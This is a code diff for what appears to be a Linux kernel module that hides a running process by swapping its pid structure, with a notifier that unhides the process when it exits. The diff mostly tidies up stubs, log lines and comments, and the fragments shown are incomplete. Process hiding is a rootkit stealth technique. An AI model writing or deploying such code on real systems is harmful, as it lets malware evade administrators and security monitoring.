@@ -19,7 +19,6 @@
 static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type, struct pid *new);
 struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type);
 static struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type, 	struct pid *pid);
-void free_pid(struct pid *pid);
 static int hideProcess(int pidNumber);
 
 //todo: group these to allow hiding multiple tasks..
@@ -29,7 +28,6 @@ struct pid *oldPidToRestore = NULL;
 int notificationFunction(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
 	//printInfo("in notification function for exit - task is %p\n", task);
 	if (task == hiddenTask) {
-		printInfo("FOUND PID THAT WAS HIDDEN");
 
 		{
 			//TODO: check which pid type to restore - this may put too many in..
@@ -42,7 +40,7 @@ int notificationFunction(struct notifier_block *notifierBlock, unsigned long unk
 		}
 
 		//TODO: restore oldPidToRestore
-
+		printInfo("about to exit for PID THAT WAS HIDDEN - finished unhiding it to allow exit\n");
 
 		hiddenTask = NULL;
 	}
@@ -56,10 +54,10 @@ struct notifier_block notificationOnProcessExit = {
 	.priority = 1, // TODO: CHECK THIS
 };
 
-
+//TODO: move this higher in the file
 int processHider_init(void) {
 	//TODO: only hide proccess when wanted ...
-	//pid_t pid = 22825; //TODO: change this
+	//pid_t pid = 3288; //TODO: change this
 	//hideProcess(pid); // todo: perhaps use result of function call..
 	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
 
@@ -154,8 +152,7 @@ static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_ty
 		}
 	}
 
-	// don't free so that it can be assigned again later
-	//free_pid(oldPid);
+	// don't free so that it can be re-assigned again later
 	return oldPid;
 }
 
@@ -172,8 +169,3 @@ struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
 	return oldPid;
 }
 
-
-void free_pid(struct pid *pid) {
-	//TODO: copy this from pid.c / fill in dependancies etc..
-
-}
